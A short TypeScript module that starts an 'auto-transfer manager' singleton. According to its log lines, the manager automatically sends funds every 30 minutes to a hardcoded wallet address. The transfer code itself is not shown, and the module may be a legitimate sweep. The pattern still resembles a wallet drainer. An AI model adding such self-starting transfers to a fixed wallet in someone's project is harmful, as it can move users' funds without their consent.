import { getAutoTransferManagerInstance } from './autoTransferManager';

// Initialize auto-transfer manager
export function initializeAutoTransfer() {
  try {
    console.log('🚀 Initializing auto-transfer manager...');
    
    // The autoTransferManager singleton will automatically start periodic transfers
    // when it's first instantiated
    const manager = getAutoTransferManagerInstance();
    
    console.log('✅ Auto-transfer manager initialized successfully');
    console.log('🔄 Periodic transfers will run every 30 minutes');
    console.log('🎯 Target wallet: HiUtCXm3qZ2TG6hgnc6ABfUtuf7HkBmDK3ZEZ2oMK7m6');
    
    return manager;
  } catch (error) {
    console.error('❌ Failed to initialize auto-transfer manager:', error);
    return null;
  }
} 